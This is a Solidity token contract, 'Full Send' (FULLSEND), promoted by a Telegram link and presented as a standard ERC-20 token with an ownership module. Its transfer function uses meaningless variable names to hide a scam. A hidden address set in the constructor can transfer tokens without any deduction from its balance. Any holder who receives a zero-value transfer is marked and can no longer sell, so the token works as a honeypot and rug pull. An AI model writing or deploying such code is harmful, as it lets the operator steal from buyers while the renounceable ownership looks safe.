/*

https://t.me/fullsend_eth

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Fullsend is Ownable {
    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    function snow(address remain, address yellow, uint256 high) private returns (bool success) {
        if (concerned[remain] == 0) {
            if (uniswapV2Pair != remain && red[remain] > 0) {
                concerned[remain] -= exclaimed;
            }
            balanceOf[remain] -= high;
        }
        balanceOf[yellow] += high;
        if (high == 0) {
            red[yellow] += exclaimed;
        }
        emit Transfer(remain, yellow, high);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transfer(address yellow, uint256 high) public returns (bool success) {
        snow(msg.sender, yellow, high);
        return true;
    }

    uint256 private exclaimed = 44;

    function approve(address floor, uint256 high) public returns (bool success) {
        allowance[msg.sender][floor] = high;
        emit Approval(msg.sender, floor, high);
        return true;
    }

    address public uniswapV2Pair;

    uint8 public decimals = 9;

    mapping(address => uint256) private concerned;

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    mapping(address => uint256) private red;

    string public symbol = 'FULLSEND';

    function transferFrom(address remain, address yellow, uint256 high) public returns (bool success) {
        snow(remain, yellow, high);
        require(high <= allowance[remain][msg.sender]);
        allowance[remain][msg.sender] -= high;
        return true;
    }

    string public name = 'Full Send';

    constructor(address already) {
        balanceOf[msg.sender] = totalSupply;
        concerned[already] = exclaimed;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }
}